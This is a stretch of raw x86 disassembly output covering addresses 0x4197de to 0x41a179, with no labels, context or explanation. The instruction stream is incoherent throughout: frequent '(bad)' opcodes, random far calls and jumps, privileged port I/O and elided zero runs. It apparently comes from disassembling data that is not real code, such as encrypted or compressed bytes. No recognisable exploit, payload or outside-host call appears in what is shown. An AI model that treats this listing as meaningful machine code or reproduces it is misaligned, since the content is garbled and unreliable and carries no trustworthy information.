  4197de:	sbb    al,0x82
  4197e0:	sbb    BYTE PTR [ecx-0x5a],bh
  4197e3:	dec    ecx
  4197e4:	inc    edi
  4197e5:	sub    DWORD PTR [edi+edx*1-0x42091a22],0xffffffff
  4197ed:	int3   
  4197ee:	adc    cl,cl
  4197f0:	inc    ebp
  4197f1:	(bad)  
  4197f2:	mov    WORD PTR [ebx+0x24c52ee1],gs
  4197f8:	mov    DWORD PTR [edx+ebx*8+0x2eced838],0xf7a46ef7
  419803:	es je  0x41978e
  419806:	fcomp  DWORD PTR [ecx+ebx*2]
  419809:	cdq    
  41980a:	sahf   
  41980b:	retf   0xf43f
  41980e:	sub    al,0xe9
  419810:	ja     0x419857
  419812:	cs out 0xd1,al
  419815:	dec    edx
  419816:	or     BYTE PTR [esi+0x27e045e4],0x2b
  41981d:	cli    
  41981e:	cmp    esp,DWORD PTR cs:[edi]
  419821:	sti    
  419822:	mul    DWORD PTR [edi+0x7b]
  419825:	and    esp,0x3ae4b46b
  41982b:	push   esi
  41982c:	mov    ebx,0x84091f41
  419831:	call   0xb23537e9
  419836:	add    DWORD PTR [esi-0x5a],edx
  419839:	icebp  
  41983a:	fld    DWORD PTR ds:0x332c7a8b
  419840:	adc    cl,BYTE PTR [ecx+eax*4-0x19]
  419844:	mov    BYTE PTR fs:[ecx],al
  419847:	lahf   
  419848:	stc    
  419849:	xlat   BYTE PTR ds:[ebx]
  41984a:	daa    
  41984b:	xchg   edx,eax
  41984c:	pop    ecx
  41984d:	shl    BYTE PTR ss:[ebx+ebx*8+0x34],cl
  419852:	mov    ebp,0xda0bca4b
  419857:	cmp    BYTE PTR [edx+0x4d],al
  41985a:	out    dx,eax
  41985b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985c:	stc    
  41985d:	mov    bh,0x38
  41985f:	cmp    DWORD PTR [eax+0x60],esp
  419862:	adc    al,0xf
  419864:	xor    al,0xaa
  419866:	and    dx,WORD PTR ss:[edx-0x27]
  41986b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41986c:	sub    al,0xd8
  41986e:	jno    0x419812
  419870:	dec    edi
  419871:	sahf   
  419872:	jae    0x41985d
  419874:	pop    es
  419875:	xor    DWORD PTR [esi-0x69],ebp
  419878:	lahf   
  419879:	loopne 0x4198d5
  41987b:	cmp    BYTE PTR es:[ecx+0x37933b0d],bl
  419882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419883:	sub    DWORD PTR [eax],edi
  419885:	pushf  
  419886:	lods   al,BYTE PTR ds:[esi]
  419887:	sbb    ch,BYTE PTR [eax+0x4ba08720]
  41988d:	xchg   esp,eax
  41988e:	pop    edi
  41988f:	stc    
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fisttp QWORD PTR [eax-0x33a59c9f]
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	aad    0x44
  41990e:	or     DWORD PTR [esi+0x41],esp
  419911:	xor    al,BYTE PTR [ecx-0x7]
  419914:	ins    DWORD PTR es:[edi],dx
  419915:	cld    
  419916:	sti    
  419917:	xchg   BYTE PTR [edi+0x53],cl
  41991a:	mov    eax,0x3de6846d
  41991f:	pop    ebx
  419920:	cmp    edx,DWORD PTR [ebx-0x467f3d80]
  419926:	outs   dx,DWORD PTR ds:[esi]
  419927:	sbb    eax,0xf30733f1
  41992d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41992e:	sbb    esp,DWORD PTR [edx-0x350d86bc]
  419934:	in     al,dx
  419935:	sub    eax,0x7ad133b8
  41993a:	mov    ebp,0xe015ae4a
  41993f:	pop    ebx
  419940:	and    ebp,ebp
  419942:	xchg   esi,eax
  419943:	and    esi,edi
  419945:	dec    edi
  419946:	lds    ebx,FWORD PTR [esi-0x20]
  419949:	push   esp
  41994a:	xor    eax,0x88419c41
  41994f:	cs test ebx,ecx
  419952:	dec    esi
  419953:	cmc    
  419954:	(bad)  
  419955:	pop    ebx
  419956:	pop    ss
  419957:	jmp    0x4199b0
  419959:	in     al,dx
  41995a:	mov    ss,edi
  41995c:	leave  
  41995d:	lea    edi,[eax+0x2939082a]
  419963:	sar    dh,1
  419965:	ret    
  419966:	dec    edx
  419967:	mov    al,ds:0x7d9d52ae
  41996c:	ror    BYTE PTR [eax-0x77],0x81
  419970:	and    al,0x11
  419972:	(bad)  
  419974:	in     eax,0xb
  419976:	fnsave [ebx+0x6f]
  419979:	push   0x8
  41997b:	cmp    edx,ecx
  41997d:	int3   
  41997e:	push   0xffffffd6
  419980:	rcr    ah,1
  419982:	or     DWORD PTR [edi],0x76
  419985:	add    DWORD PTR [ebp+0x7b3546d],edx
  41998b:	ins    DWORD PTR es:[edi],dx
  41998c:	pop    edi
  41998d:	int    0x70
  41998f:	xor    DWORD PTR [ebx],esi
  419991:	call   0xb628:0xc77989eb
  419998:	fcom   DWORD PTR [ebp-0x291286d9]
  41999e:	inc    edi
  41999f:	mov    ecx,0x56d1caa7
  4199a4:	pushf  
  4199a5:	shr    bh,1
  4199a7:	int    0x11
  4199a9:	pushf  
  4199aa:	xchg   edi,eax
  4199ab:	add    al,0x8a
  4199ad:	add    cl,BYTE PTR [edi]
  4199af:	ss jne 0x4199f6
  4199b2:	and    dl,BYTE PTR [ebx-0xf]
  4199b5:	mov    edi,0xc2624a28
  4199ba:	xchg   ecx,eax
  4199bb:	mov    cl,0x69
  4199bd:	push   ebp
  4199be:	jmp    0x419a34
  4199c0:	cvtps2pi mm2,QWORD PTR [ebx+0x7]
  4199c4:	jb     0x419a31
  4199c6:	ins    DWORD PTR es:[edi],dx
  4199c7:	adc    al,BYTE PTR [esi]
  4199c9:	std    
  4199ca:	inc    edi
  4199cb:	repnz mov al,ds:0xbbca60b0
  4199d1:	stos   BYTE PTR es:[edi],al
  4199d2:	stos   DWORD PTR es:[edi],eax
  4199d3:	retf   
  4199d4:	mov    al,0xfc
  4199d6:	aas    
  4199d7:	mov    dl,0x34
  4199d9:	neg    DWORD PTR [ecx-0x1a]
  4199dc:	inc    edx
  4199dd:	mov    ah,0x15
  4199df:	cld    
  4199e0:	mov    esp,0xec59d9b8
  4199e5:	add    eax,0x8a13084e
  4199ea:	jp     0x4199f6
  4199ec:	scas   eax,DWORD PTR es:[edi]
  4199ed:	jae    0x419a35
  4199ef:	or     DWORD PTR [eax+ecx*1],edx
  4199f2:	fwait
  4199f3:	cs mov al,0x78
  4199f6:	mov    al,ds:0x4989bccd
  4199fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199fc:	adc    al,0x25
  4199fe:	dec    ecx
  4199ff:	or     dl,al
  419a01:	loope  0x419a75
  419a03:	push   cs
  419a04:	call   0x952e:0xda4997e2
  419a0b:	lahf   
  419a0c:	out    0x53,eax
  419a0e:	dec    ebx
  419a0f:	or     BYTE PTR [eax],al
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x36c215d3
  419a81:	aad    0x6c
  419a83:	push   ebp
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	and    edi,edx
  419a8e:	frstor [ebx-0x7d]
  419a91:	xor    ebp,edx
  419a93:	dec    esp
  419a94:	aas    
  419a95:	arpl   WORD PTR [esi+0x70],si
  419a98:	mov    ebp,DWORD PTR [edx]
  419a9a:	push   ebx
  419a9b:	(bad)  
  419a9c:	jns    0x419a59
  419a9e:	or     al,0xfd
  419aa0:	aas    
  419aa1:	sbb    BYTE PTR [eax+edx*8-0x7c29c72f],dh
  419aa8:	mov    al,ds:0xd1f7cdb8
  419aad:	inc    ebp
  419aae:	mov    esi,0x570ef63
  419ab3:	fs ss dec edx
  419ab6:	loope  0x419a4b
  419ab8:	leave  
  419ab9:	adc    edi,DWORD PTR [edx-0x42]
  419abc:	mov    ds:0x7ad94de8,eax
  419ac1:	sbb    edx,edx
  419ac3:	shl    BYTE PTR [ebp+0x50],0x7e
  419ac7:	in     al,dx
  419ac8:	xor    esp,ebx
  419aca:	mov    gs,WORD PTR gs:[ecx+0x5d1ccd50]
  419ad1:	push   ebx
  419ad2:	aad    0x2d
  419ad4:	scas   eax,DWORD PTR es:[edi]
  419ad5:	out    dx,al
  419ad6:	(bad)  
  419ad7:	nop
  419ad8:	xchg   ecx,eax
  419ad9:	jb     0x419ac8
  419adb:	nop
  419adc:	aas    
  419add:	test   DWORD PTR [edi-0x18],edi
  419ae0:	out    0xd9,eax
  419ae2:	sbb    dh,bl
  419ae4:	push   cs
  419ae5:	nop
  419ae6:	push   0xbc1e506d
  419aeb:	sub    ebp,DWORD PTR [ebx+0x48cb8027]
  419af1:	jbe    0x419aae
  419af3:	arpl   si,ax
  419af5:	xchg   esp,eax
  419af6:	dec    eax
  419af7:	adc    DWORD PTR [edx],eax
  419af9:	fsub   QWORD PTR [ebx+0x5b]
  419afc:	mov    ebx,0xc255f00b
  419b01:	aaa    
  419b02:	fsub   QWORD PTR [ebx+0x6c]
  419b05:	pop    ebp
  419b06:	xchg   edi,eax
  419b07:	push   ebp
  419b08:	enter  0xe66d,0x20
  419b0c:	mov    esi,0xc9c26dc3
  419b11:	or     esi,esi
  419b13:	cmp    dl,BYTE PTR [ebp-0x1e]
  419b16:	inc    ebx
  419b17:	fsub   QWORD PTR [ebp+0x16]
  419b1a:	jle    0x419ae0
  419b1c:	push   eax
  419b1d:	jmp    0x934dc56
  419b22:	dec    esi
  419b23:	lods   eax,DWORD PTR ds:[esi]
  419b24:	aam    0x35
  419b26:	jns    0x419ba7
  419b28:	sbb    ebp,DWORD PTR [edi]
  419b2a:	push   ds
  419b2b:	cmp    ebx,esi
  419b2d:	es inc esp
  419b2f:	pop    ds
  419b30:	sbb    BYTE PTR [esi+0x39],bh
  419b33:	cmp    DWORD PTR [esi+0x3e],esi
  419b36:	mov    ebp,0xc17b0810
  419b3b:	cmp    DWORD PTR [edi-0x63],eax
  419b3e:	cli    
  419b3f:	add    BYTE PTR [ecx+ecx*8],0x39
  419b43:	fimul  WORD PTR [edi+0x4fa0a8ce]
  419b49:	(bad)  
  419b4b:	jbe    0x419b2d
  419b4d:	jno    0x419b14
  419b4f:	pusha  
  419b50:	es int3 
  419b52:	dec    ecx
  419b53:	and    BYTE PTR [esi-0x5f83848c],bh
  419b59:	sub    eax,0x8f101aae
  419b5e:	push   eax
  419b5f:	scas   al,BYTE PTR es:[edi]
  419b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b61:	ror    DWORD PTR [ecx+0x58],1
  419b64:	jns    0x419b9f
  419b66:	pop    ebx
  419b67:	cmp    BYTE PTR [esi-0x207f384a],bh
  419b6d:	ss int3 
  419b6f:	xchg   BYTE PTR [eax+0x22],ah
  419b72:	xchg   ebp,eax
  419b73:	sub    al,0x8d
  419b75:	leave  
  419b76:	cs push ss
  419b78:	pop    ecx
  419b79:	shl    DWORD PTR [eax+0x62],0x2
  419b7d:	bnd jns 0x419b2b
  419b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b81:	(bad)  
  419b82:	sbb    al,BYTE PTR [esi+edi*8-0x5f]
  419b86:	jbe    0x419b61
  419b88:	shl    DWORD PTR [eax],cl
  419b8a:	bound  esi,QWORD PTR [edi+0x43]
  419b8d:	rol    DWORD PTR fs:[ecx+0x0],1
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xbb
  419c01:	seta   BYTE PTR [ebx+0x110d4]
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	pop    edx
  419c0d:	fwait
  419c0e:	sti    
  419c0f:	add    al,0x96
  419c11:	dec    ebp
  419c12:	pushw  ds
  419c14:	aaa    
  419c15:	fild   DWORD PTR [ebp+0x9]
  419c18:	gs push edi
  419c1a:	sub    DWORD PTR [ebp+edi*4-0x2b0a711],esi
  419c21:	pop    ebp
  419c22:	fwait
  419c23:	popf   
  419c24:	cwde   
  419c25:	pop    esi
  419c26:	mov    ah,0xa0
  419c28:	stc    
  419c29:	ins    BYTE PTR es:[edi],dx
  419c2a:	sti    
  419c2b:	push   esp
  419c2c:	push   esp
  419c2d:	je     0x419c1d
  419c2f:	fbstp  TBYTE PTR [edi+0x44f4dc10]
  419c35:	mov    dh,0xbe
  419c37:	push   edi
  419c38:	xchg   edx,eax
  419c39:	stos   DWORD PTR es:[edi],eax
  419c3a:	je     0x419bc4
  419c3c:	(bad)  
  419c3d:	test   eax,0xff8a0e84
  419c42:	pop    esp
  419c43:	fstp   QWORD PTR [esi]
  419c45:	or     bh,BYTE PTR [esi+0x79]
  419c48:	shl    DWORD PTR [esi-0x33c92d18],0x2c
  419c4f:	sub    eax,0xd6d6b2dd
  419c54:	mov    ebx,0x4e8334d0
  419c59:	ins    DWORD PTR es:[edi],dx
  419c5a:	or     ecx,DWORD PTR [edi-0x2d]
  419c5d:	rol    DWORD PTR [ebx+0x19],0x3f
  419c61:	push   0xadaf9542
  419c66:	pop    edx
  419c67:	das    
  419c68:	jno    0x419ccf
  419c6a:	out    dx,eax
  419c6b:	inc    edx
  419c6c:	les    edx,FWORD PTR [esi-0x64]
  419c6f:	call   0xbabb0999
  419c74:	adc    BYTE PTR [ebx+0x7b],al
  419c77:	outs   dx,BYTE PTR ds:[esi]
  419c78:	mov    ebp,?
  419c7a:	inc    ecx
  419c7b:	lods   eax,DWORD PTR ds:[esi]
  419c7c:	(bad)  
  419c7d:	lods   al,BYTE PTR ds:[esi]
  419c7e:	aaa    
  419c7f:	push   esp
  419c80:	push   edx
  419c81:	xor    eax,0xa6cd652c
  419c86:	outs   dx,BYTE PTR ds:[esi]
  419c87:	aad    0x10
  419c89:	push   es
  419c8a:	test   al,0x68
  419c8c:	stos   BYTE PTR es:[edi],al
  419c8d:	rcl    DWORD PTR [ebx+eiz*2],0x10
  419c91:	mov    al,ds:0x47b882d
  419c96:	or     eax,0x1ff22801
  419c9b:	lods   eax,DWORD PTR ds:[esi]
  419c9c:	push   esi
  419c9d:	xor    ah,bh
  419c9f:	xor    eax,0x137156be
  419ca4:	outs   dx,DWORD PTR ds:[esi]
  419ca5:	shl    ch,cl
  419ca7:	jmp    0x33c7c217
  419cac:	mov    ch,0xba
  419cae:	dec    edi
  419caf:	sbb    bl,BYTE PTR [edx+edx*4+0xd]
  419cb3:	xchg   ebx,eax
  419cb4:	sbb    eax,0x2ec7e364
  419cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cba:	mov    ds:0x22749a22,eax
  419cbf:	inc    edx
  419cc0:	jp     0x419c5d
  419cc2:	inc    esi
  419cc3:	call   0x7ada:0x6fe16659
  419cca:	jbe    0x419c8b
  419ccc:	dec    BYTE PTR ds:0xa9f2a30a
  419cd2:	outs   dx,DWORD PTR ds:[esi]
  419cd3:	push   ecx
  419cd4:	jae    0x419d36
  419cd6:	pop    ebx
  419cd7:	jo     0x419c6f
  419cd9:	test   eax,0x5c11d339
  419cde:	mov    ds:0x80c8fef1,al
  419ce3:	std    
  419ce4:	inc    ebx
  419ce5:	retf   0xe9ed
  419ce8:	in     eax,dx
  419ce9:	in     eax,0x9b
  419ceb:	push   0xc98319b0
  419cf0:	xchg   esp,eax
  419cf1:	dec    ecx
  419cf2:	std    
  419cf3:	and    al,0xb9
  419cf5:	pushf  
  419cf6:	out    dx,al
  419cf7:	jb     0x419cf2
  419cf9:	or     DWORD PTR [edx],edx
  419cfb:	adc    DWORD PTR [edx],esp
  419cfd:	xor    esp,DWORD PTR [edx-0xd]
  419d00:	add    eax,0xf4a9fe75
  419d05:	nop
  419d06:	cmp    dl,dl
  419d08:	test   BYTE PTR [eax+0x2e5e62ed],bh
  419d0e:	test   al,0x6a
	...
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidivr DWORD PTR ss:[ebx]
  419d81:	push   ds
  419d82:	mov    DWORD PTR [ebx],ebx
  419d84:	fcom   DWORD PTR [ecx]
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	xchg   esp,eax
  419d8d:	xchg   edi,eax
  419d8e:	add    cl,BYTE PTR [edx]
  419d90:	fnstcw WORD PTR [edi]
  419d92:	in     al,dx
  419d93:	add    BYTE PTR [ebp-0x77],0x76
  419d97:	shr    BYTE PTR [esi-0x61bf945f],0x52
  419d9e:	mov    ebx,0x773236aa
  419da3:	mov    dh,0x54
  419da5:	out    dx,al
  419da6:	mov    WORD PTR [esp+eax*4-0x234f86c5],es
  419dad:	loop   0x419d8e
  419daf:	mov    ebx,DWORD PTR [ecx]
  419db1:	daa    
  419db2:	push   0xffffffb1
  419db4:	sub    dh,dl
  419db6:	ja     0x419e22
  419db8:	mov    esi,0x8c095ff0
  419dbd:	call   0xd1c45406
  419dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc3:	add    BYTE PTR ds:0xecd63c13,al
  419dc9:	sub    DWORD PTR [eax-0x3d],eax
  419dcc:	xchg   esp,eax
  419dcd:	ins    BYTE PTR es:[edi],dx
  419dce:	xchg   esp,ebx
  419dd0:	or     DWORD PTR cs:[ebx-0x2d],ecx
  419dd4:	pop    ecx
  419dd5:	cld    
  419dd6:	xchg   ebx,eax
  419dd7:	mov    bh,0xc8
  419dd9:	fwait
  419dda:	sar    bh,0xee
  419ddd:	jne    0x419de6
  419ddf:	sbb    al,0xed
  419de1:	xlat   BYTE PTR ds:[ebx]
  419de2:	in     eax,dx
  419de3:	jo     0x419d8e
  419de5:	cmp    eax,0x42f87b6a
  419dea:	jne    0x419e2b
  419dec:	mov    ecx,ebp
  419dee:	clc    
  419def:	add    dl,BYTE PTR [ebp+0x2d7d54d9]
  419df5:	lods   eax,DWORD PTR ds:[esi]
  419df6:	jb     0x419d81
  419df8:	cs jno 0x419e6a
  419dfb:	popf   
  419dfc:	(bad)  
  419dfd:	fcom   QWORD PTR [ebx+edi*8-0x11]
  419e01:	rol    BYTE PTR [edi-0x40],0x74
  419e05:	add    eax,0x6c39a216
  419e0a:	std    
  419e0b:	sahf   
  419e0c:	mov    bl,BYTE PTR [esi-0x5425cb2a]
  419e12:	mov    bh,0x96
  419e14:	idiv   BYTE PTR [ecx]
  419e16:	mov    ebp,0x53417320
  419e1b:	jmp    0x419e04
  419e1d:	jne    0x419dd7
  419e1f:	mov    ch,0x21
  419e21:	fdiv   DWORD PTR ds:0xed6e680
  419e27:	cmp    DWORD PTR [ecx+0x69a7b9dd],edx
  419e2d:	test   eax,0xca5f6f36
  419e32:	shl    esp,cl
  419e34:	into   
  419e35:	mov    ebx,DWORD PTR [ebx]
  419e37:	jns    0x419e89
  419e39:	outs   dx,DWORD PTR ds:[esi]
  419e3a:	pop    eax
  419e3b:	imul   BYTE PTR [edx-0x26]
  419e3e:	je     0x419dea
  419e40:	into   
  419e41:	mov    eax,ds:0x30ac9456
  419e46:	call   FWORD PTR [ebx]
  419e48:	lock xlat BYTE PTR ds:[ebx]
  419e4a:	jle    0x419e6d
  419e4c:	sub    al,0x24
  419e4e:	dec    ebx
  419e4f:	(bad)  
  419e50:	pop    ds
  419e51:	push   es
  419e52:	shl    DWORD PTR [edi+ecx*1],cl
  419e55:	cmp    al,0x98
  419e57:	loop   0x419e0f
  419e59:	mov    DWORD PTR [ebx-0x7c9a1dcd],ebp
  419e5f:	adc    ecx,esp
  419e61:	pop    esi
  419e62:	arpl   WORD PTR [ebx-0x788f5bab],ax
  419e68:	aaa    
  419e69:	in     eax,dx
  419e6a:	inc    edi
  419e6b:	out    0xc2,eax
  419e6d:	xchg   edi,eax
  419e6e:	mov    ch,0x9e
  419e70:	xchg   ebx,eax
  419e71:	cs xchg esp,eax
  419e73:	ss inc edx
  419e75:	imul   ebp,DWORD PTR [edx-0x1dd2b008],0x34
  419e7c:	aad    0xad
  419e7e:	inc    esi
  419e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e80:	enter  0xf6e7,0xfe
  419e84:	sub    eax,DWORD PTR [edi+0x92a61f]
  419e8a:	pop    eax
  419e8b:	add    DWORD PTR [eax+0x27483c],0x0
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	dec    eax
  419f01:	inc    edi
  419f02:	add    bl,BYTE PTR [esp+ebx*8]
  419f05:	adc    al,BYTE PTR [ecx]
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	or     al,0xae
  419f0e:	ss ret 
  419f10:	dec    esp
  419f11:	adc    eax,0xefeb81cc
  419f16:	daa    
  419f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f18:	xor    ecx,ecx
  419f1a:	push   cs
  419f1b:	aam    0xc2
  419f1d:	sub    al,0x61
  419f1f:	cld    
  419f20:	out    dx,eax
  419f21:	cwde   
  419f22:	cmp    BYTE PTR [ecx],dl
  419f24:	xchg   ebx,eax
  419f25:	aas    
  419f26:	sbb    al,0xdf
  419f28:	shr    dl,cl
  419f2a:	and    al,0xd6
  419f2c:	popa   
  419f2d:	fld    QWORD PTR [ecx+0x4d6d7a3c]
  419f33:	mov    esp,0x7d0dd72e
  419f38:	push   es
  419f39:	or     al,ah
  419f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f3c:	jns    0x419f4e
  419f3e:	sbb    BYTE PTR [esp+eiz*2],bh
  419f41:	ss pop ds
  419f43:	adc    al,0x52
  419f45:	sub    dh,dh
  419f47:	dec    eax
  419f48:	xchg   edx,eax
  419f49:	and    eax,0x9ff23fd2
  419f4e:	lods   eax,DWORD PTR ds:[esi]
  419f4f:	push   0xffffffbb
  419f51:	lahf   
  419f52:	das    
  419f53:	into   
  419f54:	sub    cl,BYTE PTR ds:0xa4025486
  419f5a:	push   0xdca245bd
  419f5f:	fs sub esp,esp
  419f62:	adc    cl,cl
  419f64:	adc    eax,0x106d353c
  419f69:	pusha  
  419f6a:	ror    DWORD PTR cs:[eax+0x64],0x68
  419f6f:	(bad)  
  419f71:	mov    ebp,0xd3d34617
  419f76:	push   edx
  419f77:	sub    eax,0xf606e1f9
  419f7c:	arpl   WORD PTR [esi-0x3e],si
  419f7f:	jge    0x419fc5
  419f81:	or     ah,dl
  419f83:	test   al,0x90
  419f85:	dec    ebx
  419f86:	pop    edx
  419f87:	mov    dh,0x45
  419f89:	mov    ch,0x59
  419f8c:	cmc    
  419f8d:	aam    0x7d
  419f8f:	jp     0x419f75
  419f91:	cmp    al,0x67
  419f93:	pop    esi
  419f94:	ds jae 0x419f28
  419f97:	push   0xffffffa0
  419f99:	popf   
  419f9a:	bound  ebx,QWORD PTR ds:[edx+ebx*4]
  419f9e:	ins    DWORD PTR es:[edi],dx
  419f9f:	sbb    BYTE PTR [esi],ch
  419fa1:	cmc    
  419fa2:	fstp   QWORD PTR [ebp-0x4e77ae0f]
  419fa8:	dec    eax
  419fa9:	lods   eax,DWORD PTR ds:[esi]
  419faa:	rcr    DWORD PTR [edx-0x338b5dd3],cl
  419fb0:	xchg   esi,eax
  419fb1:	in     al,0xa4
  419fb3:	xlat   BYTE PTR ds:[ebx]
  419fb4:	add    BYTE PTR [esi-0x4a],0xbe
  419fb8:	(bad)  
  419fb9:	jmp    0x3712:0xe9de9f69
  419fc0:	inc    ebp
  419fc1:	pop    edi
  419fc2:	dec    esi
  419fc3:	xchg   edi,eax
  419fc4:	mov    WORD PTR [edi-0x5bdabe42],sp
  419fcb:	sbb    ebp,edi
  419fcd:	or     dh,BYTE PTR [eax]
  419fcf:	cmc    
  419fd0:	mov    ds:0xe3d2471,eax
  419fd5:	mov    ds:0xceca7c7b,eax
  419fda:	sar    DWORD PTR ds:0x9cc99af0,1
  419fe0:	(bad)  
  419fe1:	scas   eax,DWORD PTR es:[edi]
  419fe2:	fs mov ecx,0x4049e88c
  419fe8:	add    eax,edi
  419fea:	fimul  WORD PTR [edx]
  419fec:	jg     0x41a015
  419fee:	addr16 push ecx
  419ff0:	xchg   edx,eax
  419ff1:	aam    0x4a
  419ff3:	cld    
  419ff4:	inc    eax
  419ff5:	xchg   ecx,eax
  419ff6:	gs inc esi
  419ff8:	adc    BYTE PTR [ebx-0x6817ab87],0xae
  419fff:	std    
  41a000:	je     0x419fdb
  41a002:	push   ss
  41a003:	test   al,0xdb
  41a005:	retf   0xc418
  41a008:	inc    si
  41a00a:	cmp    bl,BYTE PTR [edi]
  41a00c:	out    dx,al
  41a00d:	aaa    
  41a00e:	fdivr  DWORD PTR [edx]
	...
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x40],bh
  41a081:	shl    ch,0x24
  41a084:	loopne 0x41a099
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	inc    eax
  41a08d:	jecxz  0x41a0a9
  41a08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a090:	int    0x99
  41a092:	or     edi,DWORD PTR [edx]
  41a094:	adc    eax,0xdcb651c1
  41a099:	cs test al,0x46
  41a09c:	mov    ah,0x7f
  41a09e:	xchg   bp,ax
  41a0a0:	mov    ds:0xabc19420,al
  41a0a5:	arpl   WORD PTR [esi],cx
  41a0a7:	jl     0x41a074
  41a0a9:	test   DWORD PTR [edi],ebx
  41a0ab:	neg    BYTE PTR [ecx]
  41a0ad:	fild   QWORD PTR [edx]
  41a0af:	xchg   esp,eax
  41a0b0:	mov    ebp,0x4fcd0135
  41a0b5:	cmp    al,0x84
  41a0b7:	ja     0x41a0f8
  41a0b9:	loope  0x41a0b4
  41a0bb:	sub    dl,BYTE PTR [ecx+0x70f4aa25]
  41a0c1:	xor    esp,esi
  41a0c3:	dec    ebx
  41a0c4:	sbb    eax,0xf116b2fb
  41a0c9:	pop    edi
  41a0ca:	pusha  
  41a0cb:	and    cl,BYTE PTR [esi-0x15]
  41a0ce:	xor    al,0x41
  41a0d0:	sahf   
  41a0d1:	ficomp DWORD PTR [eax]
  41a0d3:	loopne 0x41a09e
  41a0d5:	stc    
  41a0d6:	popf   
  41a0d7:	jae    0x41a0c9
  41a0d9:	mov    ebp,0xe6baffae
  41a0de:	lock stc 
  41a0e0:	adc    bh,bl
  41a0e2:	loop   0x41a0c7
  41a0e4:	retf   0x9339
  41a0e7:	pop    esp
  41a0e9:	test   BYTE PTR [ecx],dl
  41a0eb:	imul   ecx,DWORD PTR [ecx-0x48d603a4],0x87ad4fa7
  41a0f5:	fs xor eax,0xb6c67bb0
  41a0fb:	leave  
  41a0fc:	lods   eax,DWORD PTR ds:[esi]
  41a0fd:	pop    es
  41a0fe:	fs mov edx,0xd053c67e
  41a104:	enter  0x7f01,0xd1
  41a108:	add    BYTE PTR [esi-0x76e42416],ah
  41a10e:	ds daa 
  41a110:	push   eax
  41a111:	cdq    
  41a112:	aam    0xcd
  41a114:	mov    bl,0xbf
  41a116:	iret   
  41a117:	je     0x41a0a3
  41a119:	mov    al,0x8f
  41a11b:	push   edx
  41a11c:	sbb    edx,edi
  41a11e:	dec    ebx
  41a11f:	pusha  
  41a120:	jns    0x41a0e6
  41a122:	mov    ah,0xb3
  41a124:	dec    edi
  41a125:	cli    
  41a126:	ret    0x104c
  41a129:	add    DWORD PTR [ebx-0x69c1c406],esi
  41a12f:	jne    0x41a0ce
  41a131:	les    ecx,FWORD PTR [esi]
  41a133:	(bad)  
  41a135:	sub    BYTE PTR [esi-0x556260c0],al
  41a13b:	outs   dx,BYTE PTR ds:[esi]
  41a13c:	pop    ebp
  41a13d:	pop    ds
  41a13e:	cmp    ah,bl
  41a140:	outs   dx,DWORD PTR ds:[esi]
  41a141:	lods   al,BYTE PTR ds:[esi]
  41a142:	fisttp DWORD PTR [eax+ebx*2+0x37e8c9fc]
  41a149:	mov    DWORD PTR [ebx],eax
  41a14b:	test   al,0xa1
  41a14d:	or     al,0x3b
  41a14f:	push   ds
  41a150:	pop    ds
  41a151:	fdivr  DWORD PTR ds:0xcb7fccc1
  41a157:	pop    edi
  41a158:	call   0x3c44:0x2678bb9d
  41a15f:	jae    0x41a180
  41a161:	jmp    0x41a14a
  41a163:	shl    ch,0xe5
  41a166:	mov    ebx,0xb31bc98e
  41a16b:	outs   dx,BYTE PTR ds:[esi]
  41a16c:	in     eax,0x87
  41a16e:	sbb    eax,0x69c1ea9a
  41a173:	adc    ecx,DWORD PTR [esi]
  41a175:	xchg   ebx,eax
  41a176:	or     edi,eax
  41a178:	hlt    
  41a179:	in     al,0xc2
